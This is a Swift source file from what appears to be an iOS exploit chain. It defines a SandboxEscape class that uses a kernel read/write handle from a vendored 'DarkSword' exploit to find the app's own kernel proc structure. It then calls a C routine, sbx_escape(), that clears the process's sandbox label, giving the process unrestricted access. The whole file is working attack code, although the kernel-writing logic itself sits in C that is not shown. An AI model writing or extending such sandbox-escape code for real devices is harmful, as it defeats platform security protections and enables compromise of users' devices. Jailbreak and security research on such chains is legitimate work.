import Foundation

public final class SandboxEscape {
    private let handle: KernelRwHandle
    private let kernelBase: UInt64
    private let procSelfAddress: UInt64

    /// Initialize sandbox escape with kernel primitives.
    /// - Parameters:
    ///   - handle: Kernel r/w handle from DarkSword exploit
    ///   - kernelBase: Base address of kernel (from XPF)
    /// - Returns: nil if our proc structure cannot be located
    public init?(handle: KernelRwHandle, kernelBase: UInt64) {
        self.handle = handle
        self.kernelBase = kernelBase

        guard let procAddr = Self.findOurProc() else {
            print("[SandboxEscape] Could not find our proc structure")
            return nil
        }
        self.procSelfAddress = procAddr
    }

    /// Find our process's proc struct in kernel memory.
    ///
    /// Delegates to ds_get_our_proc() from the vendored DarkSword exploit,
    /// which resolves the correct proc address for the current iOS version
    /// and CPU family at runtime — no hardcoded offsets needed.
    ///
    /// - Returns: Address of our proc struct, or nil
    private static func findOurProc() -> UInt64? {
        guard ds_is_ready() else {
            print("[SandboxEscape] DarkSword primitives not ready")
            return nil
        }
        let procAddr = ds_get_our_proc()
        guard procAddr > 0 else {
            print("[SandboxEscape] ds_get_our_proc returned 0")
            return nil
        }
        return procAddr
    }

    /// Clear our process's sandbox label to become unrestricted.
    /// Delegates to the vendored C sbx_escape() which handles
    /// the kernel R/W sandbox label clearing.
    @discardableResult
    public func clearSandbox() -> Bool {
        let result = sbx_escape(procSelfAddress)
        if result == 0 {
            print("[SandboxEscape] Sandbox cleared ✓")
            return true
        }
        print("[SandboxEscape] sbx_escape returned \(result)")
        return false
    }
}
